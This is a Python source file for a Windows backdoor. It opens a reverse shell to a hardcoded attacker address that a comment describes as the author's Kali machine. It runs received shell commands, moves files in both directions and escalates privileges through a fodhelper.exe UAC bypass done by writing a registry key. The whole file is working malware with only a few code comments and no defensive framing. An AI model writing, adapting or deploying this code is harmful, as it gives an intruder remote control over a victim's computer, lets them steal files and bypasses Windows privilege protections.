import socket
import json
import time
import subprocess
import os
import sys
import ctypes
import winreg

SERVER_IP = '192.168.254.49'  # IP of my Kali Linux machine
SERVER_PORT = 5555


# Sources I used as guidance to code my elevation functionality via the fodhelper.exe exploit:
# https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/uac/uacMethod2.py
# https://github.com/nForce6791/python-ransomware/blob/main/elevate_privileges.py
def elevate_privilege():
    class disable_fsr:
        disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
        revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

        def __enter__(self):
            self.old_value = ctypes.c_long()
            self.success = self.disable(ctypes.byref(self.old_value))

        def __exit__(self, exc_type, exc_val, exc_tb):
            if self.success:
                self.revert(self.old_value)

    CMD = r'C:\Windows\System32\cmd.exe'
    FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
    REG_PATH = r'Software\Classes\ms-settings\shell\open\command'

    def is_running_as_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def is_running_as_exe():
        return getattr(sys, 'frozen', False)

    def create_reg_key(name, value):
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
            registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
        except OSError:
            raise

    def delete_reg_key():
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        except:
            raise

    def bypass_uac(reg_key_command):
        try:
            create_reg_key('DelegateExecute', '')
            create_reg_key(None, reg_key_command)
        except OSError:
            raise

    def get_reg_command():
        return f'{CMD} /k "{sys.executable}"' if is_running_as_exe() \
            else f'{CMD} /k python "{os.path.abspath(__file__)}"'

    if is_running_as_admin():
        reliable_send('<REDUNDANT>')
        return
    reliable_send('[!] Backdoor is NOT running with admin privileges\n[!] Attempting to bypass UAC...')
    try:
        bypass_uac(get_reg_command())

        with disable_fsr():
            os.system(FOD_HELPER)
            delete_reg_key()

        # If escalation works, fodhelper.exe opens a new instance of the backdoor with escalated privileges
        reliable_send('<SUCCESS>')
        target_sock.close()
        sys.exit(0)
    except OSError as e:
        reliable_send(f'[!] Windows Error: {str(e)}')
        reliable_send('<FAIL>')


def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(10)
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            target_sock.close()
            break
        except:
            continue


def upload_file(filename):
    file = open(filename, 'rb')
    target_sock.send(file.read())
    file.close()


def download_file(filename):
    file = open(filename, 'wb')
    target_sock.settimeout(1)
    chunk = target_sock.recv(1024)
    while chunk:
        file.write(chunk)
        try:
            chunk = target_sock.recv(1024)
        except socket.timeout:
            break
    target_sock.settimeout(None)
    file.close()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:9] == 'download ':
            upload_file(command[9:])
        elif command[:7] == 'upload ':
            download_file(command[7:])
        elif command == 'elevate':
            elevate_privilege()
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
